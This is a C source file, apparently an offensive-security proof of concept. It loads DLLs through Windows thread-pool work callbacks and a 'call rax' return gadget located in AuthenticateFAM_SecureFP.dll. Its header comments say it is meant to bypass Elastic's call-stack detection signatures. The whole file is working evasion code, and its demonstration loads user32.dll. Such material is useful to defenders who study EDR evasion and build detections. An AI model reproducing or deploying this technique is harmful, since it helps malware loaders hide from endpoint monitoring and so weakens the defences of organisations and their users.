// Proxying DLL Loads using undocumented syscalls with call gadget from AuthenticateFAM_SecureFP.dll
// Bypasses Elastic's static signature on Tp Callbacks
// Inspiration from:      https://offsec.almond.consulting/evading-elastic-callstack-signatures.html
// Author:                @kleiton0x7e

#include "Windows.h"
#include <stdio.h>

#define ALLOC_ON_CODE _Pragma("section(\".text\")") __declspec(allocate(".text"))

typedef struct _JUMP_LOADLIBRARY_GADGET {
    LPSTR LibraryName;
    PVOID pLoadLibraryAddress;
    PVOID pGadgetAddress;
} JUMP_LOADLIBRARY_GADGET, * PJUMP_LOADLIBRARY_GADGET;

typedef NTSTATUS(NTAPI* TpAllocWork_t)(
    _Out_ PTP_WORK* WorkReturn,
    _In_  PTP_WORK_CALLBACK Callback,
    _In_opt_ PVOID Context,
    _In_opt_ PVOID CallbackEnviron
    );

typedef VOID(NTAPI* TpPostWork_t)(
    _In_ PTP_WORK Work
    );

typedef VOID(NTAPI* TpWaitForWork_t)(
    _In_ PTP_WORK Work,
    _In_ BOOLEAN CancelPendingCallbacks
    );

typedef VOID(NTAPI* TpReleaseWork_t)(
    _In_ PTP_WORK Work
    );

#ifdef __cplusplus
extern "C" {
#endif

    void WorkCallback(void);

#ifdef __cplusplus
}
#endif

PVOID GetCallGadgetAddress(
    PVOID pModule
) {

    PBYTE pDsdmo = (PBYTE)(pModule);
    DWORD i = { 0 };

    for (i = 0x1001; i < (0x1000 + 0x25001); i++) {
        if (pDsdmo[i] == 0xFF &&  // call rax
            pDsdmo[i + 1] == 0xD0 &&  // call rax
            pDsdmo[i + 2] == 0x33 &&  // xor eax, eax
            // pDsdmo[ i + 3 ] ==  0xC0 &&  // xor eax, eax
            // pDsdmo[ i + 4 ] ==  0x48 &&  // add rsp,28
            // pDsdmo[ i + 5 ] ==  0x83 &&  // add rsp,28
            // pDsdmo[ i + 6 ] ==  0xC4 &&  // add rsp,28
            pDsdmo[i + 7] == 0x28 &&  // add rsp,*28*
            pDsdmo[i + 8] == 0xC3           // *ret*
            ) {
            printf("[+] Found gadget at 0x%p\n", pDsdmo[i]);
            return &(pDsdmo[i]);
        }
    }

    printf("[-] Could not find gadget");

    return NULL;

}

HMODULE TpLoadLib(CHAR* libName) {

    PTP_WORK WorkReturn = NULL;

    JUMP_LOADLIBRARY_GADGET Params = { 0 };

    Params.LibraryName = libName;
    Params.pLoadLibraryAddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    HMODULE hDsdmo = LoadLibraryA("AuthenticateFAM_SecureFP.dll");
    printf("[+] Gadget Module loaded: 0x%p\n", hDsdmo);
    Params.pGadgetAddress = GetCallGadgetAddress(hDsdmo);

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");

    TpAllocWork_t    TpAllocWork;
    TpPostWork_t     TpPostWork;
    TpWaitForWork_t  TpWaitForWork;
    TpReleaseWork_t  TpReleaseWork;

    TpAllocWork = (TpAllocWork_t)GetProcAddress(ntdll, "TpAllocWork");
    TpPostWork = (TpPostWork_t)GetProcAddress(ntdll, "TpPostWork");
    TpWaitForWork = (TpWaitForWork_t)GetProcAddress(ntdll, "TpWaitForWork");
    TpReleaseWork = (TpReleaseWork_t)GetProcAddress(ntdll, "TpReleaseWork");

    TpAllocWork(&WorkReturn, (PTP_WORK_CALLBACK)(unsigned char*)WorkCallback, &Params, NULL);
    TpPostWork(WorkReturn);
    TpWaitForWork(WorkReturn, FALSE);
    TpReleaseWork(WorkReturn);

    return GetModuleHandleA(libName);

}

int main() {
    HMODULE user32 = TpLoadLib((CHAR*)"user32.dll");
    printf("user32.dll Address: %p\n", user32);
}